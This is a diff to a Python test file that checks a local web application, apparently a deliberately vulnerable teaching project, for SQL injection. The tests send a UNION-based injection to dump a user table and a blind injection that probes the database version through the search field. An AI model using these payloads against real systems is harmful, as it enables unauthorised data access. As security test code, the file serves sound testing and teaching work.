@@ -7,7 +7,7 @@ def test_1_sql_injection():
     cookiename = page.text.strip().split(';')[0].split('=')[0]
     cookievalue = page.text.strip().split(';')[0].split('=')[1]
     cookies = {cookiename: cookievalue}
-    params = {'search':'1" UNION Select * From `User+Store` #'}
+    params = {'search':'1" UNION Select * From `User Store` #'}
     page = requests.get('https://localhost/python/search.py', params=params, cookies=cookies, verify=False)
     assert 'User: new Title: new' in page.text
 
@@ -19,6 +19,8 @@ def test_2_blind_sql_injection():
     cookiename = page.text.strip().split(';')[0].split('=')[0]
     cookievalue = page.text.strip().split(';')[0].split('=')[1]
     cookies = {cookiename: cookievalue}
-    params = {'video':'fail'}
-    page = requests.get('https://localhost/python/delete.py', params=params, cookies=cookies, verify=False)
-    assert '/html/manage.html' in page.text
+    params = {'fileinlink':'https://www.youtube.com/watch?v=oaW1frpSSQQ', 'videoname':'testVid', 'filein':' '}
+    page = requests.get('https://localhost/python/upload.py', params=params, cookies=cookies, verify=False)
+    params = {'search':'testVid" and substring(@@version,1,1)=5 #'}
+    page = requests.get('https://localhost/python/search.py', params=params, cookies=cookies, verify=False)
+    assert 'User: new Title: testVid' in page.text
